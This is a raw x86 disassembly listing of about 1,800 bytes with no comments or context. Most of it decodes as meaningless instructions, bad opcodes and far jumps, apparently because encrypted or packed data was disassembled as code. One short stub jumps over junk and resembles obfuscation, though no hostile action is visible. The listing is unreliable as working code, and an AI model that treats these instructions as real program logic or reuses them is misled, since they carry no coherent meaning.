  40f9d3:	jg     0x40f9ee
  40f9d5:	inc    esp
  40f9d6:	scas   al,BYTE PTR es:[edi]
  40f9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9d8:	jbe    0x40f9c0
  40f9da:	adc    eax,0xcfa837a7
  40f9df:	sub    edx,DWORD PTR fs:[edi-0x1d]
  40f9e3:	pop    edx
  40f9e4:	pop    esp
  40f9e5:	in     al,0x52
  40f9e7:	pop    ecx
  40f9e8:	pop    ebp
  40f9e9:	out    dx,eax
  40f9ea:	sti    
  40f9eb:	mov    bh,0x29
  40f9ed:	push   es
  40f9ee:	adc    eax,0x809e4831
  40f9f3:	add    DWORD PTR [eax-0x6b],0xfffffff9
  40f9f7:	fnstsw ax
  40f9f9:	mov    eax,0x3c7a08a7
  40f9fe:	xchg   ecx,eax
  40f9ff:	xor    DWORD PTR [ebx+ecx*2-0x9],edx
  40fa03:	cdq    
  40fa04:	mov    dh,ch
  40fa06:	mov    edi,0xd5cf8c05
  40fa0b:	sar    BYTE PTR [ebx+0x62575725],cl
  40fa11:	push   ss
  40fa12:	add    eax,0xd69fe3b6
  40fa17:	sahf   
  40fa18:	sbb    esp,DWORD PTR [ebp-0x60]
  40fa1b:	xchg   dl,bh
  40fa1d:	push   esp
  40fa1e:	cmp    ecx,eax
  40fa20:	and    BYTE PTR [edi],ch
  40fa22:	jl     0x40fa93
  40fa24:	scas   eax,DWORD PTR es:[edi]
  40fa25:	jne    0x40fa12
  40fa27:	popa   
  40fa28:	or     eax,0x591ce48c
  40fa2d:	sahf   
  40fa2e:	cmp    eax,0x1e67daff
  40fa33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa34:	push   0xcd4c2533
  40fa39:	shld   DWORD PTR [ebx-0x2c],esi,0xb3
  40fa3e:	mov    ds:0xf0c34009,al
  40fa43:	imul   edi,DWORD PTR [eax+ebp*1],0x5670cef0
  40fa4a:	scas   eax,DWORD PTR es:[edi]
  40fa4b:	in     eax,dx
  40fa4c:	push   ss
  40fa4d:	ja     0x40fa87
  40fa4f:	push   ds
  40fa50:	xchg   esp,eax
  40fa51:	dec    eax
  40fa52:	cmp    dh,BYTE PTR [ebp*8+0x653d9d91]
  40fa59:	test   edx,esp
  40fa5b:	cld    
  40fa5c:	and    DWORD PTR gs:[ecx+0x1766a868],eax
  40fa63:	mov    eax,0x17736483
  40fa68:	cmp    BYTE PTR [ebp+0x6c],dl
  40fa6b:	pop    ecx
  40fa6c:	mov    bl,0x79
  40fa6e:	ins    DWORD PTR es:[edi],dx
  40fa6f:	sbb    edi,ebx
  40fa71:	imul   edx,DWORD PTR [edx],0x75
  40fa74:	pop    es
  40fa75:	scas   eax,DWORD PTR es:[edi]
  40fa76:	(bad)  
  40fa77:	or     al,0x8f
  40fa79:	ins    BYTE PTR es:[edi],dx
  40fa7a:	nop
  40fa7b:	jo     0x40f9ff
  40fa7d:	dec    esp
  40fa7e:	or     bh,BYTE PTR [ecx+edi*1-0x2d]
  40fa82:	mov    BYTE PTR [edx-0x19],ch
  40fa85:	add    dh,ch
  40fa87:	fdivr  DWORD PTR ds:0x17c9e3f9
  40fa8d:	push   edx
  40fa8e:	(bad)  
  40fa90:	clc    
  40fa91:	test   DWORD PTR [esi-0x336e1272],0x6979a1f8
  40fa9b:	ins    BYTE PTR es:[edi],dx
  40fa9c:	push   ss
  40fa9d:	sub    ecx,DWORD PTR [edx-0x43ba721c]
  40faa3:	dec    ebx
  40faa4:	add    esp,0xadecf96e
  40faaa:	sbb    DWORD PTR [ebx+0x70a46f13],ebx
  40fab0:	sub    BYTE PTR [esi],0x20
  40fab3:	test   ebx,0x9a93b496
  40fab9:	sub    bl,BYTE PTR [edx-0x44]
  40fabc:	adc    ebx,DWORD PTR [esi-0x4c]
  40fabf:	cli    
  40fac0:	in     eax,0x14
  40fac2:	jle    0x40fa72
  40fac4:	out    0xee,al
  40fac6:	cmp    DWORD PTR [eax+edi*8+0x6e388ae7],ebx
  40facd:	sti    
  40face:	cs dec esi
  40fad0:	and    bl,BYTE PTR [ecx]
  40fad2:	bnd call 0x92055542
  40fad8:	pushf  
  40fad9:	xchg   ebp,eax
  40fada:	push   ebx
  40fadb:	jl     0x40fb1b
  40fadd:	in     eax,dx
  40fade:	push   eax
  40fadf:	pop    eax
  40fae0:	push   cs
  40fae1:	adc    DWORD PTR [edx+0x392eaa41],edi
  40fae7:	xor    dl,BYTE PTR [eax-0x33]
  40faea:	pop    ebp
  40faeb:	xor    esp,DWORD PTR ds:0xa66730f8
  40faf1:	xchg   esp,eax
  40faf2:	ins    DWORD PTR es:[edi],dx
  40faf3:	pop    es
  40faf4:	xchg   BYTE PTR [ebx+0x1c],ch
  40faf7:	push   es
  40faf8:	cwde   
  40faf9:	aas    
  40fafa:	loope  0x40fab4
  40fafc:	jmp    0x3b64:0xfe0c873d
  40fb03:	dec    edx
  40fb04:	add    esp,DWORD PTR [edi-0x41]
  40fb07:	addr16 lahf 
  40fb09:	call   0x52ff:0x9d25458
  40fb10:	cmp    al,0x3c
  40fb12:	cld    
  40fb13:	mov    esi,0x98095613
  40fb18:	xlat   BYTE PTR ds:[ebx]
  40fb19:	into   
  40fb1a:	xor    DWORD PTR [edi],ebp
  40fb1c:	inc    ebx
  40fb1d:	(bad)  
  40fb1f:	pop    esp
  40fb20:	jmp    0x2e7f:0xea23df46
  40fb27:	dec    ebp
  40fb28:	mov    esi,0xc3e6f050
  40fb2d:	int3   
  40fb2e:	mov    BYTE PTR [esi],ch
  40fb30:	into   
  40fb31:	add    eax,0xde447d0
  40fb36:	js     0x40fad0
  40fb38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb39:	fisttp QWORD PTR [eax+0x57]
  40fb3c:	jae    0x40fb97
  40fb3e:	(bad)  
  40fb3f:	repz into 
  40fb41:	xor    ch,BYTE PTR [ebx-0x1a]
  40fb44:	mov    ebp,DWORD PTR fs:[edx]
  40fb47:	fadd   DWORD PTR [ecx+0x48]
  40fb4a:	mov    ds:0xf8e2c2f6,eax
  40fb4f:	sbb    dh,bl
  40fb51:	sar    cl,cl
  40fb53:	(bad)  
  40fb55:	out    dx,eax
  40fb56:	mov    eax,DWORD PTR [esi]
  40fb58:	mov    bl,0x1b
  40fb5a:	jmp    0x40fb5d
  40fb5c:	dec    ebx
  40fb5d:	xchg   BYTE PTR [ebx+eiz*2+0x2],cl
  40fb61:	jne    0x40fbd4
  40fb63:	in     al,dx
  40fb64:	das    
  40fb65:	sbb    edx,DWORD PTR [edx-0x517e31da]
  40fb6b:	xchg   DWORD PTR [edx],edi
  40fb6d:	sub    BYTE PTR [esi+edi*8],0xa0
  40fb71:	fwait
  40fb72:	(bad)  
  40fb73:	mov    ch,0xd6
  40fb75:	retf   0x461f
  40fb78:	jle    0x40fb35
  40fb7a:	lods   al,BYTE PTR ds:[esi]
  40fb7b:	push   0x1b
  40fb7d:	cli    
  40fb7e:	aas    
  40fb7f:	sub    al,0x6e
  40fb81:	cs mov al,0x56
  40fb84:	add    eax,0x6fd1cc23
  40fb89:	sahf   
  40fb8a:	stos   DWORD PTR es:[edi],eax
  40fb8b:	pop    eax
  40fb8c:	cmp    ebx,edi
  40fb8e:	out    0x68,al
  40fb90:	adc    ch,0xd5
  40fb93:	les    ebp,FWORD PTR [ecx+ebx*1-0x4f]
  40fb97:	pop    eax
  40fb98:	das    
  40fb99:	push   ds
  40fb9a:	push   es
  40fb9b:	into   
  40fb9c:	fdiv   st(5),st
  40fb9e:	in     eax,dx
  40fb9f:	sub    DWORD PTR [ebp+0x79860f30],0x5bfffff9
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffffcd
  40fbc9:	mov    dh,0x57
  40fbcb:	dec    edx
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	mov    BYTE PTR [edi+0x49c0f42d],dh
  40fbda:	data16 or BYTE PTR [edi],ch
  40fbdd:	int    0x0
  40fbdf:	clc    
  40fbe0:	ins    DWORD PTR es:[edi],dx
  40fbe1:	in     eax,0xd1
  40fbe3:	fdivr  st(5),st
  40fbe5:	daa    
  40fbe6:	pop    ecx
  40fbe7:	jnp    0x40fb8f
  40fbe9:	mov    ecx,0xc51e7cfb
  40fbee:	fisub  WORD PTR [ecx]
  40fbf0:	leave  
  40fbf1:	lods   al,BYTE PTR ds:[esi]
  40fbf2:	out    dx,al
  40fbf3:	aam    0x15
  40fbf5:	pop    ecx
  40fbf6:	sub    al,0x23
  40fbf8:	sar    DWORD PTR [eax-0x7d],1
  40fbfb:	or     DWORD PTR [ebx+0x26f7069c],eax
  40fc01:	loopne 0x40fc05
  40fc03:	mov    bl,0xf1
  40fc05:	into   
  40fc06:	push   ecx
  40fc07:	pop    ebp
  40fc08:	adc    dh,BYTE PTR [edi+0x62]
  40fc0b:	mov    al,0x1f
  40fc0d:	lahf   
  40fc0e:	mov    al,ds:0x371e2dd6
  40fc13:	les    ebp,FWORD PTR [eax+0x1c404c99]
  40fc19:	mov    eax,0x4456a3ef
  40fc1e:	pushf  
  40fc1f:	jp     0x40fbad
  40fc21:	and    eax,ecx
  40fc23:	inc    eax
  40fc24:	xlat   BYTE PTR ds:[ebx]
  40fc25:	xchg   ecx,eax
  40fc26:	loop   0x40fc6a
  40fc28:	pop    edi
  40fc29:	xchg   esp,eax
  40fc2a:	jae    0x40fbce
  40fc2c:	test   BYTE PTR [ebp+0x22],bh
  40fc2f:	(bad)  
  40fc30:	idiv   cl
  40fc32:	shl    BYTE PTR [edx+0x5516d87e],1
  40fc38:	pop    esi
  40fc39:	(bad)  
  40fc3a:	not    DWORD PTR [ecx-0x5a]
  40fc3d:	das    
  40fc3e:	aam    0xba
  40fc40:	jmp    0x1a3e1374
  40fc45:	lock pop edx
  40fc47:	icebp  
  40fc48:	mov    bh,0xd6
  40fc4a:	sbb    eax,0xa6b05942
  40fc4f:	ss and al,0xd6
  40fc52:	mul    ecx
  40fc54:	mov    bl,0xb4
  40fc56:	push   edi
  40fc57:	adc    cl,BYTE PTR [edx]
  40fc59:	mul    DWORD PTR [ebx-0x37bdc96e]
  40fc5f:	ja     0x40fc98
  40fc61:	in     al,dx
  40fc62:	stc    
  40fc63:	mov    ah,0x8f
  40fc65:	jmp    0x40fc04
  40fc67:	jb     0x40fca7
  40fc69:	and    dl,dh
  40fc6b:	add    bl,dh
  40fc6d:	repnz add BYTE PTR [edx],cl
  40fc70:	shl    bl,cl
  40fc72:	push   0x8c95ff3b
  40fc77:	xor    ebx,DWORD PTR [edx+ecx*8]
  40fc7a:	clc    
  40fc7b:	adc    ebx,0xd6d06815
  40fc81:	xchg   DWORD PTR [ebx-0x2e08e7ef],edi
  40fc87:	mov    al,0x5a
  40fc89:	and    eax,0xa599dd4
  40fc8e:	mov    cl,BYTE PTR [edx+0x66]
  40fc91:	push   esp
  40fc92:	dec    esp
  40fc93:	mov    WORD PTR [ebp+0x2733b3f5],cs
  40fc99:	adc    eax,0xc48d08a2
  40fc9e:	ja     0x40fcc4
  40fca0:	jae    0x40fc2a
  40fca2:	cmp    ecx,ebx
  40fca4:	pop    ebp
  40fca5:	xor    bh,al
  40fca7:	lods   al,BYTE PTR ds:[esi]
  40fca8:	std    
  40fca9:	and    esp,esi
  40fcab:	sbb    BYTE PTR [ebx],al
  40fcad:	enter  0x1f22,0x5b
  40fcb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcb2:	push   eax
  40fcb3:	push   cs
  40fcb4:	loop   0x40fc88
  40fcb6:	jl     0x40fc9a
  40fcb8:	xor    dl,0x7e
  40fcbb:	call   0x3c9a0b94
  40fcc0:	jecxz  0x40fcd6
  40fcc2:	aad    0x18
  40fcc4:	inc    edx
  40fcc5:	push   esp
  40fcc6:	add    eax,0x15e7ca7f
  40fccb:	cld    
  40fccc:	cwde   
  40fccd:	in     eax,0x10
  40fccf:	fld    QWORD PTR [ebx+0x2b]
  40fcd2:	mov    ebp,0xaf68caed
  40fcd7:	push   0xd
  40fcd9:	in     eax,0xfe
  40fcdb:	add    BYTE PTR [edx],bh
  40fcdd:	push   ss
  40fcde:	pop    eax
  40fcdf:	scas   eax,DWORD PTR es:[edi]
  40fce0:	loop   0x40fcb7
  40fce2:	mov    edi,0xb68ff7bd
  40fce7:	je     0x40fd5e
  40fce9:	pop    edi
  40fcea:	call   0xa7:0x9eb10d3b
  40fcf1:	push   eax
  40fcf2:	test   DWORD PTR [edi-0x1565f3ea],ebp
  40fcf8:	(bad)  
  40fcf9:	jecxz  0x40fd53
  40fcfb:	sub    eax,0x4c8e6cd1
  40fd00:	in     al,0xcc
  40fd02:	fisubr WORD PTR [edx+0x5b]
  40fd05:	cs sbb al,0x12
  40fd08:	lahf   
  40fd09:	fcom   st(7)
  40fd0b:	push   ecx
  40fd0c:	test   eax,0x98d81f13
  40fd11:	cmp    ah,BYTE PTR [ebx]
  40fd13:	pushf  
  40fd14:	sub    esp,DWORD PTR [esi-0x18]
  40fd17:	dec    ebp
  40fd18:	jle    0x40fd22
  40fd1a:	adc    DWORD PTR [edi-0x72],edx
  40fd1d:	mov    ch,0x9
  40fd1f:	(bad)  
  40fd20:	xchg   ecx,eax
  40fd21:	cmc    
  40fd22:	inc    ecx
  40fd23:	pop    ecx
  40fd24:	imul   ebx,edi,0x81cf8636
  40fd2a:	and    ebx,ecx
  40fd2c:	cwde   
  40fd2d:	dec    edx
  40fd2e:	nop
  40fd2f:	push   ecx
  40fd30:	pop    esi
  40fd31:	out    dx,al
  40fd32:	pop    ss
  40fd33:	cmp    edx,DWORD PTR [ecx+0x57]
  40fd36:	fnstenv [edx]
  40fd38:	ins    DWORD PTR es:[edi],dx
  40fd39:	(bad)  
  40fd3a:	jmp    0x1e67caab
  40fd3f:	lock or al,0x62
  40fd42:	dec    ebx
  40fd43:	(bad)  
  40fd44:	xchg   edx,eax
  40fd45:	xchg   edx,eax
  40fd46:	outs   dx,DWORD PTR fs:[esi]
  40fd48:	arpl   WORD PTR [ebx+0x7b],sp
  40fd4b:	out    dx,eax
  40fd4c:	(bad)  
  40fd4e:	cmp    edx,DWORD PTR [esp+eax*2-0x31]
  40fd52:	mov    dl,0xda
  40fd54:	lahf   
  40fd55:	inc    esi
  40fd56:	xchg   ecx,eax
  40fd57:	cmp    BYTE PTR [edx-0x4a6ef071],ah
  40fd5d:	xchg   edi,eax
  40fd5e:	xor    eax,0x4413a431
  40fd63:	mov    al,0xde
  40fd65:	mov    DWORD PTR [ecx-0x43],esi
  40fd68:	pop    esp
  40fd69:	add    DWORD PTR [ebx+0x5a7071a3],esi
  40fd6f:	into   
  40fd70:	mov    esp,0x9b28cfb4
  40fd75:	push   0x4
  40fd77:	xchg   DWORD PTR ds:0x7a825231,ebp
  40fd7d:	arpl   sp,sp
  40fd7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd80:	xor    eax,0x91d4e049
  40fd85:	(bad)  
  40fd86:	leave  
  40fd87:	inc    edi
  40fd88:	std    
  40fd89:	sbb    ecx,DWORD PTR [ebx]
  40fd8b:	in     eax,dx
  40fd8c:	aad    0xcc
  40fd8e:	mov    bh,0xbf
  40fd90:	pop    es
  40fd91:	jmp    0x616aa753
  40fd96:	(bad)  
  40fd98:	in     eax,dx
  40fd99:	push   es
  40fd9a:	or     DWORD PTR [ecx+0x24502902],edi
  40fda0:	mov    ebp,0xefb64775
  40fda5:	icebp  
  40fda6:	xor    dh,BYTE PTR [eax-0x2d]
  40fda9:	sub    DWORD PTR [ebp-0x4c],esi
  40fdac:	mov    ebp,0x7bcd4b25
  40fdb1:	pusha  
  40fdb2:	jmp    0xb519:0xae555da2
  40fdb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdba:	pop    ss
  40fdbb:	call   0xbf3d1b43
  40fdc0:	sbb    DWORD PTR [edi],edx
  40fdc2:	sar    BYTE PTR [esi-0x31],1
  40fdc5:	mov    eax,0x677ae079
  40fdca:	mov    ds:0x7b926be3,al
  40fdcf:	int    0x80
  40fdd1:	push   ebx
  40fdd2:	jl     0x40fe06
  40fdd4:	pop    ecx
  40fdd5:	(bad)  
  40fdd6:	cmp    eax,0xe491e44b
  40fddb:	sub    ebp,0x49
  40fdde:	push   eax
  40fddf:	sub    dl,0x47
  40fde2:	sbb    al,BYTE PTR [eax]
  40fde4:	popa   
  40fde5:	stc    
  40fde6:	test   BYTE PTR [esi-0x4c193d6b],ah
  40fdec:	add    ch,cl
  40fdee:	scas   al,BYTE PTR es:[edi]
  40fdef:	in     eax,0x49
  40fdf1:	idiv   BYTE PTR [ebx]
  40fdf3:	ds cmp al,0xec
  40fdf6:	jp     0x40fe1e
  40fdf8:	fwait
  40fdf9:	fs pop eax
  40fdfb:	loop   0x40fdf3
  40fdfd:	sbb    al,0xaf
  40fdff:	sub    BYTE PTR [ebp-0x28],dh
  40fe02:	and    edx,esp
  40fe04:	pop    esp
  40fe05:	jb     0x40fe69
  40fe07:	fwait
  40fe08:	mov    dh,0xfd
  40fe0a:	imul   eax,DWORD PTR [edx],0xffffffd0
  40fe0d:	repz add BYTE PTR [ebx],dl
  40fe10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe11:	sahf   
  40fe12:	xchg   BYTE PTR [eax+0x23],bl
  40fe15:	ret    0xebe8
  40fe18:	mov    cl,ch
  40fe1a:	lds    ecx,FWORD PTR [ecx]
  40fe1c:	out    0x72,eax
  40fe1e:	arpl   WORD PTR [esi+ecx*2+0x4607ae68],dx
  40fe25:	test   al,0x13
  40fe27:	jmp    0x76b9:0xbe3ce1f5
  40fe2e:	sbb    eax,0x4f33aed1
  40fe33:	dec    esp
  40fe34:	adc    al,0x7f
  40fe36:	test   eax,0x9a7526bc
  40fe3b:	imul   ebp,edi,0x5ae52869
  40fe41:	xor    BYTE PTR [edi+0x4536f991],ch
  40fe47:	sbb    dh,BYTE PTR [eax]
  40fe49:	cld    
  40fe4a:	daa    
  40fe4b:	cwde   
  40fe4c:	inc    ebp
  40fe4d:	push   esp
  40fe4e:	(bad)  
  40fe4f:	lahf   
  40fe50:	jb     0x40feae
  40fe52:	xor    ebp,0x3d
  40fe55:	arpl   ax,si
  40fe57:	push   ebx
  40fe58:	jo     0x40fec5
  40fe5a:	sbb    ebp,DWORD PTR [ebx-0x68]
  40fe5d:	jnp    0x40fe07
  40fe5f:	pop    ds
  40fe60:	jge    0x40fe0d
  40fe62:	(bad)  
  40fe63:	cmp    BYTE PTR [edi-0x5ba96cc8],al
  40fe69:	das    
  40fe6a:	dec    ebp
  40fe6b:	adc    al,0xa0
  40fe6d:	inc    edi
  40fe6e:	xor    BYTE PTR ds:0x16979b72,ch
  40fe74:	fiadd  DWORD PTR [esi+0x1547aee3]
  40fe7a:	cmp    eax,0x2b8e505d
  40fe7f:	mov    esp,0xd0abee5a
  40fe84:	lods   eax,DWORD PTR ds:[esi]
  40fe85:	scas   eax,DWORD PTR es:[edi]
  40fe86:	push   edi
  40fe87:	in     al,0x27
  40fe89:	stos   WORD PTR es:[edi],ax
  40fe8b:	xchg   esi,eax
  40fe8c:	neg    esi
  40fe8e:	mov    al,dl
  40fe90:	outs   dx,DWORD PTR ds:[esi]
  40fe91:	pop    es
  40fe92:	iret   
  40fe93:	or     BYTE PTR [ebx-0x3cce89cc],0xf3
  40fe9a:	jne    0x40febf
  40fe9c:	xchg   edi,eax
  40fe9d:	ret    
  40fe9e:	adc    DWORD PTR [edi+ebp*4],edi
  40fea1:	xchg   ebx,esp
  40fea3:	xor    edx,edi
  40fea5:	or     al,0xd
  40fea7:	or     ebp,DWORD PTR [edi+0x63]
  40feaa:	inc    edi
  40feab:	pop    eax
  40feac:	push   edi
  40fead:	fidiv  WORD PTR [ebp+0x5a]
  40feb0:	xchg   DWORD PTR [esi],edi
  40feb2:	loope  0x40fe71
  40feb4:	sub    eax,0x7d74b7a8
  40feb9:	jbe    0x40fe77
  40febb:	sub    esp,DWORD PTR [ebx-0x4f7e10cb]
  40fec1:	add    DWORD PTR [ebp*1+0xe53447b],edi
  40fec8:	les    edx,FWORD PTR [eax-0x3190ee62]
  40fece:	and    DWORD PTR [ecx+0x4f1415ab],ebx
  40fed4:	jg     0x40ff0a
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x21214346
  40fef3:	pop    ecx
  40fef4:	jo     0x40fed4
  40fef6:	mov    ch,0x7e
  40fef8:	jle    0x40ff76
  40fefa:	jge    0x40ff7a
  40fefc:	jle    0x40ff3b
  40fefe:	loopne 0x40febb
  40ff00:	and    al,0x93
  40ff02:	jo     0x40ff06
  40ff04:	mov    ds,WORD PTR [esi-0x29a55b67]
  40ff0a:	xor    bl,bl
  40ff0c:	pushf  
  40ff0d:	loopne 0x40fef1
  40ff0f:	pop    edi
  40ff10:	sbb    ebp,ebx
  40ff12:	push   esp
  40ff13:	xor    BYTE PTR [ecx-0x7cee0207],cl
  40ff19:	imul   esi,DWORD PTR [eax],0x9
  40ff1c:	in     eax,dx
  40ff1d:	aad    0xdb
  40ff1f:	lea    esp,[eax]
  40ff21:	push   esp
  40ff22:	and    dl,dl
  40ff24:	dec    edx
  40ff25:	mov    BYTE PTR [esi],ch
  40ff27:	addr16 test al,0xa2
  40ff2a:	and    eax,0x55089528
  40ff2f:	nop
  40ff30:	inc    esi
  40ff31:	xlat   BYTE PTR cs:[ebx]
  40ff33:	push   ecx
  40ff34:	(bad)  
  40ff35:	aaa    
  40ff36:	mov    esi,0x1e669e90
  40ff3b:	lods   al,BYTE PTR ds:[esi]
  40ff3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff3d:	cs jae 0x40ff86
  40ff40:	xor    DWORD PTR [edi],edx
  40ff42:	(bad)  
  40ff43:	arpl   WORD PTR [ecx+0x6f],cx
  40ff46:	xchg   ecx,eax
  40ff47:	push   ecx
  40ff48:	jp     0x40ffa3
  40ff4a:	dec    eax
  40ff4b:	mov    DWORD PTR [edx-0xd],ecx
  40ff4e:	sub    BYTE PTR [ecx+0xbd336c4],0x31
  40ff55:	(bad)  
  40ff56:	add    DWORD PTR gs:[esi+edi*2-0x4adc0a15],0xc816a458
  40ff62:	cli    
  40ff63:	out    0xb5,eax
  40ff65:	jge    0x40ffca
  40ff67:	popf   
  40ff68:	pop    ss
  40ff69:	sub    eax,0xe33dec16
  40ff6e:	mov    DWORD PTR [edi+0x22],ebx
  40ff71:	mov    edi,0x327dea67
  40ff76:	loop   0x40ff8c
  40ff78:	xchg   esi,eax
  40ff79:	outs   dx,DWORD PTR ds:[esi]
  40ff7a:	push   edi
  40ff7b:	div    BYTE PTR [esi]
  40ff7d:	stos   DWORD PTR es:[edi],eax
  40ff7e:	call   0x1735:0xfe3dd031
  40ff85:	xchg   edx,eax
  40ff86:	(bad)  
  40ff88:	rcr    BYTE PTR [esi+0x107ef01a],0xe5
  40ff8f:	iret   
  40ff90:	icebp  
  40ff91:	inc    ebx
  40ff92:	adc    esp,ebp
  40ff94:	mov    edi,0xad898169
  40ff99:	hlt    
  40ff9a:	mov    cl,0xe3
  40ff9c:	clc    
  40ff9d:	(bad)  
  40ff9e:	xor    al,0xce
  40ffa0:	jmp    0x40ff93
  40ffa2:	or     al,BYTE PTR [eax+0x5a]
  40ffa5:	sub    al,0xf3
  40ffa7:	pop    esp
  40ffa8:	rcl    DWORD PTR gs:[ebx],0xe9
  40ffac:	jmp    0x7329a3d7
  40ffb1:	cmc    
  40ffb2:	cmp    dh,BYTE PTR [ecx]
  40ffb4:	repz push 0xffffffb0
  40ffb7:	and    cl,BYTE PTR [ebx]
  40ffb9:	xchg   edx,eax
  40ffba:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40ffbc:	imul   ebx,DWORD PTR [edi+0x276db6c6],0x6d595f0a
  40ffc6:	(bad)  
  40ffc7:	rcr    BYTE PTR [ebx-0x32],cl
  40ffca:	cli    
  40ffcb:	sbb    al,bh
  40ffcd:	popf   
  40ffce:	sbb    al,0x52
  40ffd0:	inc    ecx
  40ffd1:	mov    ds:0x4d7cdd07,al
  40ffd6:	xchg   DWORD PTR [edi+ebp*4],esi
  40ffd9:	enter  0xc476,0xc7
  40ffdd:	das    
  40ffde:	pop    eax
  40ffdf:	cmp    eax,0x44f10c7f
  40ffe4:	test   BYTE PTR [esi+0x7e02da4],ch
  40ffea:	test   edx,esi
  40ffec:	add    edi,edx
  40ffee:	mov    ecx,0x187868d1
  40fff3:	(bad)  
  40fff4:	data16 ror BYTE PTR [edx+0x23],cl
  40fff8:	jae    0x41002c
  40fffa:	push   ss
  40fffb:	add    ebp,ebp
  40fffd:	cs test eax,0xc62f6c44
  410003:	mov    edx,0x27d87318
  410008:	pop    ecx
  410009:	scas   eax,DWORD PTR es:[edi]
  41000a:	add    DWORD PTR [edx-0xca67041],eax
  410010:	jo     0x41003d
  410012:	pop    ebx
  410013:	mov    esp,0x8c9c7a29
  410018:	add    DWORD PTR [edx+0x75],ebx
  41001b:	inc    ebx
  41001c:	nop
  41001d:	mov    eax,ds:0x484d3da1
  410022:	adc    BYTE PTR [edx-0x1562a60b],ch
  410028:	push   edi
  410029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41002a:	mov    al,0xf4
  41002c:	add    ebp,DWORD PTR [edx-0x25]
  41002f:	test   al,0x59
  410031:	out    dx,eax
  410032:	dec    ebx
  410033:	adc    DWORD PTR [ebp+0x1573e929],ecx
  410039:	xchg   DWORD PTR [edi],esi
  41003b:	ja     0x410081
  41003d:	mul    DWORD PTR [ebx]
  41003f:	mov    esp,0xb774ff63
  410044:	das    
  410045:	pop    edi
  410046:	cmp    ch,dh
  410048:	mov    esp,0xa9239325
  41004d:	test   BYTE PTR [ebx-0x68700a04],bh
  410053:	add    eax,0x8b6e5db5
  410058:	mov    al,0xe9
  41005a:	or     ebx,ebx
  41005c:	adc    al,0x31
  41005e:	scas   al,BYTE PTR es:[edi]
  41005f:	in     al,dx
  410060:	scas   eax,DWORD PTR es:[edi]
  410061:	sbb    al,0x0
  410063:	jne    0x41002a
  410065:	(bad)  
  410066:	xchg   edi,eax
  410067:	test   al,0x4e
  410069:	push   ebp
  41006a:	pop    edi
  41006b:	ds jmp 0x410071
  41006e:	out    0xa1,al
  410070:	bound  eax,QWORD PTR [ecx+0x21]
  410073:	test   ebx,ecx
  410075:	add    edi,DWORD PTR [ebp-0x78]
  410078:	xchg   edx,eax
  410079:	repz leave 
  41007b:	mov    bh,0x21
  41007d:	es es pop ds
  410080:	and    DWORD PTR [ecx],esi
  410082:	mov    edx,0x87d6b5f8
  410087:	jp     0x4100d4
  410089:	jno    0x4100be
  41008b:	das    
  41008c:	xchg   esi,eax
  41008d:	mov    esp,DWORD PTR [ebx+0x7cdc1bcd]
  410093:	push   ds
  410094:	mov    eax,DWORD PTR [ebp-0x3b]
  410097:	and    al,0x99
  410099:	sahf   
  41009a:	test   DWORD PTR [esi+0x4a],esi
  41009d:	lods   al,BYTE PTR ds:[esi]
  41009e:	pop    ebx
  41009f:	dec    ecx
  4100a0:	push   DWORD PTR [edx]
  4100a2:	outs   dx,DWORD PTR ds:[esi]
  4100a3:	jge    0x410122
  4100a5:	jp     0x41004a
  4100a7:	xor    edi,DWORD PTR [eax+0x11]
  4100aa:	or     al,0xec
  4100ac:	outs   dx,DWORD PTR ds:[esi]
  4100ad:	pop    es
  4100ae:	fisubr DWORD PTR [ebp-0x13]
  4100b1:	pop    edx
  4100b2:	push   edi
  4100b3:	cmp    BYTE PTR [edi-0x1ad51bc2],ah
  4100b9:	(bad)  
  4100ba:	ss je  0x410052
  4100bd:	xor    dh,ch
  4100bf:	cmp    eax,0x77d776c7
  4100c4:	sub    al,0x55
  4100c6:	xchg   ecx,eax
  4100c7:	fsubr  QWORD PTR [eax-0xc]
  4100ca:	data16 jmp 0x41007e
  4100cd:	(bad)  
  4100ce:	repz or eax,0xf75a1655
  4100d4:	or     cl,bh
  4100d6:	push   es
  4100d7:	push   eax
  4100d8:	sub    ebx,esi
  4100da:	fst    DWORD PTR [esi-0x12]
  4100dd:	mov    ds:0x7f6b1484,al
  4100e2:	rol    DWORD PTR [ebp+0x72],0x31
  4100e6:	push   eax
  4100e7:	dec    eax
  4100e8:	push   es
  4100e9:	pusha  
  4100ea:	jle    0x41010f
  4100ec:	and    esp,DWORD PTR [eax+0x6184b07d]
  4100f2:	fst    QWORD PTR [ecx]
  4100f4:	mov    bh,0xd1
  4100f6:	mov    bh,0x1c
  4100f8:	call   0x94f9f24a
  4100fd:	rcl    WORD PTR [esi+0x3f90df62],0x83
  410105:	add    DWORD PTR [ebx-0x2fe7f51d],edi
  41010b:	ret    0xc42b
  41010e:	scas   al,BYTE PTR es:[edi]
  41010f:	sti    
  410110:	dec    ebp
  410111:	push   ebx
  410112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410113:	fwait
  410114:	or     DWORD PTR [edx],esp
  410116:	mov    edi,0x18b76a8c
  41011b:	dec    esp
  41011c:	clc    
  41011d:	jmp    0xf60:0xbd95e6ca
